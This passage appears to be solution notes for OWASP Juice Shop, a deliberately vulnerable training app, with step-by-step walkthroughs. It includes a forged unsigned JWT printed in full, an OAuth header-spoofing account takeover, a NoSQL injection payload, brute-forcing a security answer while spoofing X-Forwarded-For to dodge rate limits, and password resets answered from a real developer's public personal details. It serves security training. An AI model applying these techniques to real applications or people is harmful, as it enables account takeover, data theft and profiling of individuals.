+</p><p id="d7b4de9d-0dd2-4f41-96a5-731f0c79d9d5" class=""> 7.  now simply use this site to <a href="https://simplycalc.com/base64url-encode.php">https://simplycalc.com/base64url-encode.php</a> make a both attribute     </p><p id="5184e245-e11d-42d2-87cb-027ccbf0c268" class="">base64url encoded as </p><figure id="fa35671d-7a1f-42c0-ba1d-02d0e238b28c" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.31.13_AM_(2).png"><img style="width:891px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.31.13_AM_(2).png"/></a></figure><figure id="830775e2-7f9c-4b43-a640-ec454b88854f" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.30.31_AM_(2).png"><img style="width:1177px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.30.31_AM_(2).png"/></a></figure><p id="8d401263-a0f9-47df-90f3-372aede1b304" class="">
+</p><p id="2bcab029-df41-4839-8d64-62e5a70e44d2" class=""><code>base64url(header).base64url(payload).</code></p><p id="261fb412-4a4e-40aa-b3ca-d3893ad4905f" class="">(.) dot is important on both ends.</p><p id="7299cd79-6d2f-4d11-83be-3ee9388afd0c" class="">and we get the following string as a token / Authorization Token</p><p id="c54222c8-11a4-4191-b389-7f286bc8f04b" class=""><code>ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxNiwKICAgICJ1c2VybmFtZSI6ICIiLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiODI3Y2NiMGVlYThhNzA2YzRjMzRhMTY4OTFmODRlN2IiLAogICAgInJvbGUiOiAiY3VzdG9tZXIiLAogICAgImxhc3RMb2dpbklwIjogIjE3Mi4xNy4wLjEiLAogICAgInByb2ZpbGVJbWFnZSI6ICJkZWZhdWx0LnN2ZyIsCiAgICAidG90cFNlY3JldCI6ICIiLAogICAgImlzQWN0aXZlIjogdHJ1ZSwKICAgICJjcmVhdGVkQXQiOiAiMjAxOS0xMC0yMCAwNzoyNjo0NC43MjIgKzAwOjAwIiwKICAgICJ1cGRhdGVkQXQiOiAiMjAxOS0xMC0yMCAwOTo0NTowMS45MDIgKzAwOjAwIiwKICAgICJkZWxldGVkQXQiOiBudWxsCiAgfSwKICAiaWF0IjogMTU3MTYzMDE5NSwKICAiZXhwIjogMTU3MTY0ODE5NQp9.</code></p><p id="d25c9a7d-9a76-4f4a-9a7b-5915f281a07e" class="">
+</p><p id="c281343a-ff3c-4326-a5ce-7fd2f88c4690" class="">8.  now use this as Authorization header to send request </p><p id="851172d7-b815-4fc4-9367-c4b7c4629694" class="">
+</p><figure id="e9fb2dd3-20b5-425f-be84-66d9181d8e44" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.30.14_AM.png"><img style="width:1216px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.30.14_AM.png"/></a></figure><p id="c3010e3f-8b2a-4a65-ab3d-638153cff1a3" class="">
+</p><figure id="2701dc85-ac75-45d1-a6c0-cb15cdc0f9e6" class="image"><a href="OWASP Juice Shop/Screenshot_2019-10-21_at_10.15.31_AM_(2).png"><img style="width:720px" src="OWASP Juice Shop/Screenshot_2019-10-21_at_10.15.31_AM_(2).png"/></a></figure><p id="548b5df0-e860-48d1-8feb-99911d8d61dd" class="">
+</p><h2 id="d4af8f30-e249-4bf1-a803-a77242a9ae70" class="">8 -Login CISO</h2><h3 id="9fa81d30-9555-4972-bbde-8a9902924147" class="">Exploit OAuth 2.0 to log in with the Chief Information Security Officer&#x27;s user account.</h3><p id="a61bcb2c-bc6e-4b07-bb49-92d1ab912567" class="">
+</p><p id="88a3085c-be0d-4f3e-b791-dccb2fb011b7" class="">
+</p><ol id="bc9dc7b8-5f7c-4844-bd80-17ea805529fd" class="numbered-list" start="1"><li>Visit <a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a> and enter some known credentials.</li></ol><ol id="7b81064b-760d-4675-a21a-aded202045f0" class="numbered-list" start="2"><li>Tick the <em>Remember me</em> checkbox and <em>Log in</em>.</li></ol><ol id="c56341c1-89a8-46aa-b623-7c6debc377b6" class="numbered-list" start="3"><li>Inspecting the application cookies shows a new <code>email</code> cookie storing the plaintext email address.</li></ol><ol id="5f53100f-b21d-4949-af21-9bc0163a9467" class="numbered-list" start="4"><li><em>Log out</em> and go back to <a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a>. Make sure <em>Remember me</em> is still ticked.</li></ol><ol id="ab1609a3-f6e1-4da9-a7c4-30551c13477b" class="numbered-list" start="5"><li>Using <code>ciso@juice-sh.op</code> as <em>Email</em> and anything as <em>Password</em> perform a failed login attempt.</li></ol><ol id="8bf493ff-d595-4699-9ae8-a61d736ace91" class="numbered-list" start="6"><li>Inspecting the <code>email</code> cookie shows it was set to <code>ciso@juice-sh.op</code> even when login failed.</li></ol><ol id="62c8ea5c-4e5f-4267-a374-7383859c005f" class="numbered-list" start="7"><li>Inspecting any request being sent from now on you will notice a new custom HTTP header <code>X-User-Email: ciso@juice-sh.op</code>.</li></ol><ol id="bf4859c4-ee3a-41f0-af2c-928caaa4165f" class="numbered-list" start="8"><li>Now visit <a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a> again, but this time choose the <em>Log in with Google</em> button to log in with your own Google account.</li></ol><ol id="f00d32eb-afbd-4a26-8394-1565ac0fd1bf" class="numbered-list" start="9"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a> and check the <em>Author</em> field to be surprised that you are logged in as <code>ciso@juice-sh.op</code> instead with your Google email address, because <a href="https://incognitjoe.github.io/hacking-the-juice-shop.html">the OAuth integration for login will accept the &#x27;X-User-Email&#x27; header as gospel regardless of the account that just logged in</a>.</li></ol><p id="cee1d8b0-f20f-43cb-a49d-efe676b69bab" class="">If you do not own a Google account to log in with or are running the Juice Shop on a hostname that is not recognized, you can still solve this challenge by logging in regularly but add <code>&quot;oauth&quot;: true</code> to the JSON payload <code>POST</code>ed to <a href="http://localhost:3000/rest/user/login">http://localhost:3000/rest/user/login</a>.</p><p id="d78836e9-a873-4d7e-9dc3-adb8fa4cdeec" class="">
+</p><p id="43f50e32-9a65-465c-91c2-2178a2396d96" class="">
+</p><h2 id="9f083b9e-8c2a-414d-9e67-94262e514ccf" class="">9 - NoSQL Exfiltration</h2><h3 id="c3db3d11-ff32-4a51-87e2-a4fe3e370264" class="">All your orders are belong to us! Even the ones which don&#x27;t.</h3><p id="00e66975-b0ab-4134-b8f5-591eff2ab051" class="">
+</p><ol id="7fc3d2ab-b63f-4e8e-8bad-d1c53f69ffa3" class="numbered-list" start="1"><li>Open the network tab of your browser&#x27;s DevTools.</li></ol><ol id="52d789e6-76a8-4d5f-8d79-48c4df83cd18" class="numbered-list" start="2"><li>Visit <a href="http://localhost:3000/#/track-order">http://localhost:3000/#/track-order</a> and search for <code>x</code> to witness a <code>GET</code> request <a href="http://localhost:3000/rest/track-order/x">http://localhost:3000/rest/track-order/x</a> being sent returning <code>{&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:[{&quot;orderId&quot;:&quot;x&quot;}]}</code>.</li></ol><ol id="5e77689c-1964-42e5-8c71-0d9c6ad17e65" class="numbered-list" start="3"><li>Search for <code>&#x27;</code> (single quote) as <em>Order ID</em> now. <a href="http://localhost:3000/rest/track-order/&#x27;">http://localhost:3000/rest/track-order/&#x27;</a> will throw an error<figure id="9389f7e5-975c-4c22-bffc-5058d3cd11d3" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/error_page-nosqli.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/error_page-nosqli.png"/></a></figure><p id="f5d284c4-707c-441b-af71-fa95c7a4394a" class="">
+</p></li></ol><ol id="9aa8a964-d13e-4a6d-9722-a7eb9fc78849" class="numbered-list" start="4"><li>Searching for <code>&#x27;&#x27;</code> (two single quotes) as <em>Order ID</em> now will let <a href="http://localhost:3000/rest/track-order/&#x27;&#x27;">http://localhost:3000/rest/track-order/&#x27;&#x27;</a> throw an <code>Unexpected string</code> error instead of the previous <code>Invalid or unexpected token</code>.</li></ol><ol id="1f1df6ba-b8de-43c3-856e-be85db45c39f" class="numbered-list" start="5"><li>While not stated anywhere in the error messages, it can be assumed with some MongoDB background that the query probably resembles something like <code>{ $where: &quot;property === &#x27;&quot; + payload + &quot;&#x27;&quot; }</code>.</li></ol><ol id="922c3a69-44d2-44a8-9507-6fc8db7f4551" class="numbered-list" start="6"><li>The required <code>payload</code> for the challenge needs to make sure all data is matched while squeezing itself into the query in a non-breaking way.</li></ol><ol id="dc747750-bb95-4fee-8eac-3b25625dc05d" class="numbered-list" start="7"><li>Search for <code>&#x27; || true || &#x27;</code> resulting in <a href="http://localhost:3000/rest/track-order/&#x27;%20%7C%7C%20true%20%7C%7C%20&#x27;">http://localhost:3000/rest/track-order/&#x27;%20%7C%7C%20true%20%7C%7C%20&#x27;</a> which will in fact query and return all orders from the MarsDB.</li></ol><p id="25bb81ce-5eb8-4b7c-a1d6-1dc6c0e4b944" class="">
+</p><p id="303fcdfd-28b5-4dbe-84df-d58daa64b9a1" class="">
+</p><h2 id="c5d9074c-4147-4b61-8438-879f3c39d535" class="">10 - Reset Bjoern&#x27;s Password.</h2><h3 id="78f38e0b-5216-4bfb-8cf6-0d3d06a6629d" class="">Reset the password of Bjoern&#x27;s internal account via the Forgot Password mechanism with the original answer to his security question.</h3><p id="c29e8fcc-8d41-4c98-8112-0f4cba1fd93e" class="">
+</p><p id="f020edd0-a0d5-4e27-9b16-d846c3d9833d" class="">
+</p><ol id="a39d2cd6-15dc-4375-99fc-cac59e6df6d3" class="numbered-list" start="1"><li>Trying to find out who &quot;Bjoern&quot; might be should quickly lead you to the OWASP Juice Shop project leader and author of this ebook.</li></ol><ol id="da806c02-5fd8-47e3-ab14-f6f59fb7fb4e" class="numbered-list" start="2"><li>Visit <a href="https://www.facebook.com/bjoern.kimminich">https://www.facebook.com/bjoern.kimminich</a> to immediately learn that he is from the town of <em>Uetersen</em> in Germany.</li></ol><ol id="2a346a94-0525-4450-a040-315608ceef81" class="numbered-list" start="3"><li>Visit <a href="https://gist.github.com/9045923">https://gist.github.com/9045923</a> or <a href="https://pastebin.com/JL5E0RfX">https://pastebin.com/JL5E0RfX</a> to find the source code of a (truly amazing) game Bjoern wrote in Turbo Pascal in 1995 (when he was a teenager) to learn his phone number area code of <em>04122</em> which belongs to Uetersen. This is sufficient proof that you in fact are on the right track.</li></ol><ol id="10925399-0112-49cb-929e-99e3de46a625" class="numbered-list" start="4"><li><a href="http://www.geopostcodes.com/Uetersen">http://www.geopostcodes.com/Uetersen</a> will tell you that Uetersen has ZIP code <em>25436</em>.</li></ol><ol id="e6437aa2-26bb-41e1-86f7-f323ff9cd38c" class="numbered-list" start="5"><li>Visit <a href="http://localhost:3000/#/forgot-password">http://localhost:3000/#/forgot-password</a> and provide <code>bjoern@juice-sh.op</code> as your <em>Email</em>.</li></ol><ol id="15a8db1e-13be-4b15-ad96-7e5b91d56f28" class="numbered-list" start="6"><li>In the subsequently appearing form, provide <code>25436</code> as <em>Your ZIP/postal code when you were a teenager?</em></li></ol><ol id="7849ba1a-c5d1-4b4c-b26e-e87a52187de9" class="numbered-list" start="7"><li>Type and <em>New Password</em> and matching <em>Repeat New Password</em> followed by hitting <em>Change</em> to <strong>not solve</strong> this challenge.</li></ol><ol id="8a42c6fb-1aba-41e9-bf1d-662a2f3ff9e5" class="numbered-list" start="8"><li>Bjoern added some obscurity to his security answer by using an uncommon variant of the pre-unification format of <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#postal-codes-in-germany">postal codes in Germany</a>.</li></ol><ol id="5beefe53-2ac4-46d4-9255-a07ac3c22092" class="numbered-list" start="9"><li>Visit <a href="http://www.alte-postleitzahlen.de/uetersen">http://www.alte-postleitzahlen.de/uetersen</a> to learn that Uetersen&#x27;s old ZIP code was <code>W-2082</code>. This would not work as an answer either. Bjoern used the written out variation: <code>West-2082</code>.</li></ol><ol id="bf05670a-22dc-4252-86b5-48455e4e9c0f" class="numbered-list" start="10"><li>Change the answer to <em>Your ZIP/postal code when you were a teenager?</em> into <code>West-2082</code> and click <em>Change</em> again to finally solve this challenge.</li></ol><h3 id="e4d996fd-fd0a-4354-8535-7adea8a024cf" class=""><strong>Postal codes in Germany</strong></h3><blockquote id="dfe113bb-bd4f-49b1-bd0a-5c6e4d730f7e" class="">Postal codes in Germany, Postleitzahl (plural Postleitzahlen, abbreviated to PLZ; literally &quot;postal routing number&quot;), since 1 July 1993 consist of five digits. The first two digits indicate the wider area, the last three digits the postal district.Before reunification, both the Federal Republic of Germany (FRG) and the German Democratic Republic (GDR) used four-digit codes. Under a transitional arrangement following reunification, between 1989 and 1993 postal codes in the west were prefixed with &#x27;W&#x27;, e.g.: W-1000 [Berlin] 30 (postal districts in western cities were separate from the postal code) and those in the east with &#x27;O&#x27; (for Ost), e.g.: O-1xxx Berlin.4</blockquote><p id="a25111a8-bca8-4e39-8e24-e641efc09333" class="">
+</p><p id="014bb4bf-5373-455b-8f89-e5a3384f0e02" class="">
+</p><h2 id="316a61b4-1444-4c2e-bb04-4820b07ec136" class="">11 - Reset Morty&#x27;s Password</h2><h3 id="030cbfd0-2c4f-4c44-a163-6f2d83f9ac93" class="">Reset Morty&#x27;s password via the Forgot Password mechanism with his obfuscated answer to his security question.</h3><p id="45d147c2-b3c3-4fbc-a488-d890c1f98354" class="">
+</p><ol id="53520f0e-2b4a-4e5a-8762-4e788b3b7b5e" class="numbered-list" start="1"><li>Trying to find out who &quot;Morty&quot; might be should <em>eventually</em> lead you to <em>Morty Smith</em> as the most likely user identity<figure id="87fe399d-8ad8-4d66-bee2-54b8d6e98bbf" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Morty_Smith.jpg"><img style="width:144px" src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Morty_Smith.jpg"/></a></figure></li></ol><ol id="593b570a-57e9-49e9-ba21-102561479bbc" class="numbered-list" start="2"><li>Visit <a href="http://rickandmorty.wikia.com/wiki/Morty">http://rickandmorty.wikia.com/wiki/Morty</a> and skim through the <a href="http://rickandmorty.wikia.com/wiki/Morty#Family">Family</a> section</li></ol><ol id="7defa739-48eb-4290-a4da-446c5f7e3cd5" class="numbered-list" start="3"><li>It tells you that Morty had a dog named <em>Snuffles</em> which also goes by the alias of <em>Snowball</em> for a while.</li></ol><ol id="baee24aa-6976-4549-b9e1-e2d735f5e5cc" class="numbered-list" start="4"><li>Visit <a href="http://localhost:3000/#/forgot-password">http://localhost:3000/#/forgot-password</a> and provide <code>morty@juice-sh.op</code> as your <em>Email</em></li></ol><ol id="cf9e824a-b262-4e15-82d5-5dead510998d" class="numbered-list" start="5"><li>Create a word list of all mutations (including typical &quot;leet-speak&quot;-variations!) of the strings <code>snuffles</code> and <code>snowball</code> using only<ul id="ddd9b337-1238-47e3-9d86-31319f22871a" class="bulleted-list"><li>lower case (<code>a-z</code>)</li></ul><ul id="b06624d7-8383-4063-970c-4df382eb6755" class="bulleted-list"><li>upper case (<code>A-Z</code>)</li></ul><ul id="1c68cd4b-6a6c-441c-a874-d3c1f8acd8f8" class="bulleted-list"><li>and digit characters (<code>0-9</code>)</li></ul></li></ol><ol id="feeae497-8527-40c1-954a-b37b1a841523" class="numbered-list" start="6"><li>Write a script that iterates over the word list and sends well-formed requests to <code>http://localhost:3000/rest/user/reset-password</code>. A rate limiting mechanism will prevent you from sending more than 100 requests within 5 minutes, severely hampering your brute force attack.</li></ol><ol id="7d835544-04d2-40d9-900e-0257299dec7c" class="numbered-list" start="7"><li>Change your script so that it provides a different <code>X-Forwarded-For</code>-header in each request, as this takes precedence over the client IP in determining the origin of a request.</li></ol><ol id="32f70038-beac-4e19-a22d-5fc7abc43ce2" class="numbered-list" start="8"><li>Rerun your script you will notice at some point that the answer to the security question is <code>5N0wb41L</code> and the challenge is marked as solved.</li></ol><ol id="94840b72-4fff-4a2a-9cfe-e20462dd92b4" class="numbered-list" start="9"><li>Feel free to cancel the script execution at this point.</li></ol><p id="6f456143-26b6-4c4a-ba0e-ef6e178e3097" class="">📕: If you do not want to write your own script for this challenge, take a look at <a href="https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820">juice-shop-mortys-question-brute-force.py</a> which was kindly published as a Gist on GitHub by <a href="https://github.com/philly-vanilly">philly-vanilly</a>.</p><blockquote id="a589ec13-a38e-4e6a-bca2-ccdd0c031c57" class="">Leet (or &quot;1337&quot;), also known as eleet or leetspeak, is a system of modified spellings and verbiage used primarily on the Internet for many phonetic languages. It uses some alphabetic characters to replace others in ways thdev at play on the similarity of their glyphs via reflection or other resemblance. Additionally, it modifies certain words based on a system of suffixes and alternative meanings.The term &quot;leet&quot; is derived from the word elite. The leet lexicon involves a specialized form of symbolic writing. For example, leet spellings of the word leet include 1337 and l33t; eleet may be spelled 31337 or 3l33t. Leet may also be considered a substitution cipher, although many dialects or linguistic varieties exist in different online communities.5</blockquote><p id="b987530b-2530-4afc-b648-ad0c61a57531" class="">
+</p><p id="1407cb88-4962-4ad0-8ff2-5fbd223ba378" class="">
+</p><p id="a7711010-cbed-4b35-b578-7f5fa054136b" class="">
+</p><p id="87bf0431-f575-41e1-9e73-90f04e3e4c62" class="">
+</p><h2 id="395b3da8-3e4f-435e-9f46-2b4bb71407f5" class="">12 - Retrieve Blueprint</h2><h3 id="4197f7da-6b9d-4e0f-906d-1c667c63d8e2" class="">Deprive the shop of earnings by downloading the blueprint for one of its products.</h3><p id="a4f63839-d522-431e-83c7-ef9cbf657deb" class="">
+</p><p id="1470adb1-6119-447d-af2b-98880b928384" class="">
+</p><ol id="fd8e392b-6313-4191-af16-42f1125bbd9d" class="numbered-list" start="1"><li>The description of the <em>OWASP Juice Shop Logo (3D-printed)</em> product indicates that this product might actually have kind of a blueprint</li></ol><ol id="3240b10a-7010-4655-8749-110fcef9012f" class="numbered-list" start="2"><li>Download the product image  from <a href="http://localhost:3000/assets/public/images/products/3d_keychain.jpg">http://localhost:3000/assets/public/images/products/3d_keychain.jpg</a> and view its <a href="https://en.wikipedia.org/wiki/Exif">Exif metadata</a></li></ol><ol id="fcfa8b14-017e-4a72-a387-333c3151617f" class="numbered-list" start="3"><li>here we can use exiftool to extract data from image.</li></ol><ol id="28153846-ccac-4243-ae1f-d2c8bc6353e2" class="numbered-list" start="4"><li>Download <a href="http://localhost:3000/assets/public/images/products/3d_keychain.jpg">http://localhost:3000/assets/public/images/products</a><a href="http://localhost:3000/public/images/products/JuiceShop.stl">/JuiceShop.stl</a> to solve this challenge</li></ol><p id="2a475f25-a59d-4e3a-9719-4c6e4473c546" class="">
+</p><p id="5a49d28b-65a3-429e-ae3c-2b46188d2e0c" class="">
+</p><h2 id="cba612a8-02b5-4998-8e16-06243a422968" class="">13 - Supply Chain Attack</h2><h3 id="d460262c-078f-427e-a5f2-f7980e645fe7" class="">Inform the development team about a danger to some of their credentials. (Send them the URL of the original report or the CVE of this vulnerability)</h3><p id="541f1c72-0d68-4d32-ae5b-2a9c3631b53a" class="">
+</p><p id="d399211e-bafc-483a-8b5b-e972cfad7317" class="">
+</p><ol id="f5a42c2c-19f0-4605-8038-8ba84e3aace3" class="numbered-list" start="1"><li>Solve <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#access-a-developers-forgotten-backup-file">Access a developer&#x27;s forgotten backup file</a></li></ol><ol id="14fe55db-3af3-41a3-a59c-06eb7c693d02" class="numbered-list" start="2"><li>The <code>package.json.bak</code> contains not only runtime dependencies but also development dependencies under the <code>devDependencies</code> section.</li></ol><ol id="7b5f1f2e-089b-479a-8746-5f7beeded1ba" class="numbered-list" start="3"><li>Go through the list of <code>devDependencies</code> and perform research on vulnerabilities in them which would allow a Software Supply Chain Attack.</li></ol><ol id="78629d69-2056-49dc-9141-eeb0d3dd4fc6" class="numbered-list" start="4"><li>For the <code>eslint-scope</code> module you will learn about one such incident exactly in the pinned version <code>3.7.2</code>, e.g. <a href="https://status.npmjs.org/incidents/dn7c1fgrr7ng">https://status.npmjs.org/incidents/dn7c1fgrr7ng</a> or <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes</a></li></ol><ol id="b12a4594-ced9-41f5-8cd3-39688f318c9f" class="numbered-list" start="5"><li>Both above links refer to the original report of this vulnerability on GitHub: <a href="https://github.com/eslint/eslint-scope/issues/39">https://github.com/eslint/eslint-scope/issues/39</a></li></ol><ol id="f0a2ec25-da55-4d76-afc7-c66f40f10e63" class="numbered-list" start="6"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a></li></ol><ol id="d3def84a-85a8-4753-af0c-637f74901dcd" class="numbered-list" start="7"><li>Submit your feedback with <code>https://github.com/eslint/eslint-scope/issues/39</code> in the comment to solve this challenge</li></ol><p id="0343efcc-80c6-4a02-be12-b68d2c776285" class="">
+</p><h2 id="a42c3c59-95b1-41e2-b6e1-2a896468b5f4" class="">14 - Frontend Typosquatting</h2><h3 id="a3455bf1-9b88-46ec-830e-ca6501babf7e" class="">Inform the shop about a typosquatting imposter that dug itself deep into the frontend. (Mention the exact name of the culprit)</h3><p id="13f29c14-59cb-4709-b0ff-a1557e6fbb01" class="">
+</p><p id="15d7b852-8f71-408c-8400-37315c45b8af" class="">
+</p><ol id="8d0b1382-b44c-4747-9cb9-a8bf3675ca98" class="numbered-list" start="1"><li>Request <a href="http://localhost:3000/3rdpartylicenses.txt">http://localhost:3000/3rdpartylicenses.txt</a> to retrieve the 3rd party license list generated by Angular CLI by default</li></ol><ol id="fc0cb6a9-9b50-4585-92c6-8f054273840f" class="numbered-list" start="2"><li>Combing through the list of modules you will come across <code>ng2-bar-rating</code> which openly reveals its intent on <a href="https://www.npmjs.com/package/ng2-bar-rating">https://www.npmjs.com/package/ng2-bar-rating</a><figure id="2a189395-8152-41af-aee5-539223207132" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ng2-bar-rating.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ng2-bar-rating.png"/></a></figure></li></ol><ol id="e11ebf69-e895-49e5-8e71-bffd967ba275" class="numbered-list" start="3"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a></li></ol><ol id="a316a99f-51eb-47ff-ab40-4f1515e7e8e3" class="numbered-list" start="4"><li>Submit your feedback with <code>ng2-bar-rating</code> in the comment to solve this challenge</li></ol><p id="e7e7b776-3b5a-469f-b6e1-70afc51c2d70" class="">You can probably imagine that the typosquatted <code>ng2-bar-rating</code> would be <em>a lot harder</em> to distinguish from the original repository <code>ngx-bar-rating</code>, if it where not marked with the <em>THIS IS </em><em><strong>NOT</strong></em><em> THE MODULE YOU ARE LOOKING FOR!</em>-warning at the very top. Below you can see the original <code>ngx-bar-rating</code> module page on NPM:</p><figure id="5b7be90c-ac95-442f-bcfc-320d0b3ba50c" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ngx-bar-rating.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_ngx-bar-rating.png"/></a></figure><p id="18dc2d1c-f408-4469-b439-39cea5d9202a" class="">
+</p><p id="5340cde2-2626-4697-967d-1b9be7989096" class="">
+</p><p id="6dea6347-713d-4f0d-9e12-e4377ad5a693" class="">
+</p><p id="4c2c17d1-c1ac-42b1-971c-0aa3651e0791" class="">
+</p><p id="b4b07f8c-dfd1-49f7-9a9a-36fa20abcbd5" class="">
+</p><p id="68f70b9b-e068-439b-84aa-f36ebc8617ca" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="23355431-8c7d-4feb-9fcd-31f3c33d04cd" class="">LEVEL -6</h1><p id="d63da3ba-0215-432c-aa39-2a1b7555e6d3" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><p id="7fb89eeb-8597-4e18-8670-77fd948c3244" class="">
+</p><p id="7ece8fae-02fc-49ca-996a-9f71fdc0383a" class="">
+</p><h2 id="f0d2464b-89b6-4942-bec9-3491811209ea" class="">1 - Arbitrary File Write</h2><h3 id="da7d89e0-366e-4674-bd70-b9dd863f780d" class="">Overwrite the Legal Information file.</h3><p id="80cb0c50-43b0-45cf-a27e-443e36ecab97" class="">
+</p><p id="a8767285-8f41-432d-9116-ef40325c8078" class="">
+</p></div></article></body></html>
